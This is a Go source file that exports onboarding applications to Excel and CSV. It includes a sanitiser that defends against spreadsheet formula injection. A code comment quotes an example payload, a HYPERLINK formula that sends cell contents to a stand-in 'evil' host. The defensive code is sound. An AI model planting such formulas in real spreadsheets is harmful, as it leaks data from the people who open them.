package excel

import (
	"bytes"
	"encoding/csv"
	"fmt"

	"github.com/xuri/excelize/v2"

	"github.com/your-org/eegfaktura-member-onboarding/internal/dataexport"
)

// renderXLSX produces an Excel file from the given config + applications.
// The progress callback is invoked every 50 rows.
func renderXLSX(cfg excelConfig, apps []dataexport.ApplicationSnapshot, progress dataexport.ProgressFn) ([]byte, error) {
	f := excelize.NewFile()
	defer f.Close()

	const sheet = "Sheet1"
	if _, err := f.NewSheet(sheet); err != nil {
		// "Sheet1" already exists in a new file, ignore.
	}

	// Header row.
	for colIdx, col := range cfg.Columns {
		cell, _ := excelize.CoordinatesToCellName(colIdx+1, 1)
		if err := f.SetCellValue(sheet, cell, col.Header); err != nil {
			return nil, fmt.Errorf("set header cell %s: %w", cell, err)
		}
	}

	// Data rows. SetCellStr (not SetCellValue) forces text-type cells, which
	// already disables Excel formula interpretation. We additionally prefix
	// dangerous leading characters via sanitiseSpreadsheetValue so the value
	// is also safe when imported into LibreOffice or Google Sheets, which
	// re-evaluate text cells under some import settings.
	for rowIdx, app := range apps {
		for colIdx, col := range cfg.Columns {
			cell, _ := excelize.CoordinatesToCellName(colIdx+1, rowIdx+2) // +2: header is row 1
			val := sanitiseSpreadsheetValue(extractAndFormat(col, app))
			if err := f.SetCellStr(sheet, cell, val); err != nil {
				return nil, fmt.Errorf("set data cell %s: %w", cell, err)
			}
		}
		if progress != nil && (rowIdx+1)%50 == 0 {
			progress(rowIdx + 1)
		}
	}
	if progress != nil {
		progress(len(apps))
	}

	var buf bytes.Buffer
	if err := f.Write(&buf); err != nil {
		return nil, fmt.Errorf("write xlsx: %w", err)
	}
	return buf.Bytes(), nil
}

// renderCSV produces a UTF-8-BOM + semicolon-separated CSV file.
// Conforms to DACH-Excel conventions for automatic column splitting.
func renderCSV(cfg excelConfig, apps []dataexport.ApplicationSnapshot, progress dataexport.ProgressFn) ([]byte, error) {
	var buf bytes.Buffer
	// UTF-8 BOM so Excel recognises the encoding automatically.
	buf.Write([]byte{0xEF, 0xBB, 0xBF})

	w := csv.NewWriter(&buf)
	w.Comma = ';'

	// Header.
	headers := make([]string, len(cfg.Columns))
	for i, col := range cfg.Columns {
		headers[i] = col.Header
	}
	if err := w.Write(headers); err != nil {
		return nil, fmt.Errorf("write csv header: %w", err)
	}

	// Data rows.
	row := make([]string, len(cfg.Columns))
	for i, app := range apps {
		for j, col := range cfg.Columns {
			row[j] = sanitiseSpreadsheetValue(extractAndFormat(col, app))
		}
		if err := w.Write(row); err != nil {
			return nil, fmt.Errorf("write csv row %d: %w", i, err)
		}
		if progress != nil && (i+1)%50 == 0 {
			progress(i + 1)
		}
	}
	w.Flush()
	if err := w.Error(); err != nil {
		return nil, fmt.Errorf("flush csv: %w", err)
	}
	if progress != nil {
		progress(len(apps))
	}

	return buf.Bytes(), nil
}

// extractAndFormat pulls the raw value from the application via the field
// definition and applies the column's format transformation.
func extractAndFormat(col columnConfig, app dataexport.ApplicationSnapshot) string {
	def, ok := AvailableFields[col.Field]
	if !ok {
		return ""
	}
	raw := def.Extract(app)
	return formatValue(raw, def.Type, col.Format, def.EnumLabels)
}

// sanitiseSpreadsheetValue defangs CSV/Excel-injection vectors. Values
// whose first non-whitespace rune is '=', '+', '-', '@', TAB or CR are
// interpreted as formulas by Excel/LibreOffice; a leading apostrophe
// forces literal-text rendering. See OWASP "CSV Injection". Applied
// uniformly to XLSX and CSV output so a hostile member name like
// `=HYPERLINK("http://evil/?"&A2)` becomes a harmless cell value when
// the admin opens the export.
//
// LibreOffice's "Detect special numbers" import mode trims leading
// whitespace before formula detection, and NBSP (U+00A0) / BOM (U+FEFF)
// also slip through naive byte-0 checks. We therefore look at the first
// non-whitespace rune and treat the original string as dangerous if that
// rune is in the trigger set, regardless of any leading padding.
func sanitiseSpreadsheetValue(s string) string {
	if s == "" {
		return s
	}
	for _, r := range s {
		if isSpreadsheetWhitespace(r) {
			continue
		}
		switch r {
		case '=', '+', '-', '@', '\t', '\r':
			return "'" + s
		}
		return s
	}
	// All-whitespace string — harmless, leave untouched.
	return s
}

// isSpreadsheetWhitespace covers the chars Excel/LibreOffice trim during
// import BEFORE formula detection: ASCII space, LF, NBSP (U+00A0),
// BOM (U+FEFF). TAB and CR are NOT in this set \u2014 they are formula
// triggers themselves (DDE in legacy Excel), so a leading TAB/CR must
// defang, not be skipped over.
func isSpreadsheetWhitespace(r rune) bool {
	switch r {
	case ' ', '\n', '\u00a0', '\ufeff':
		return true
	}
	return false
}
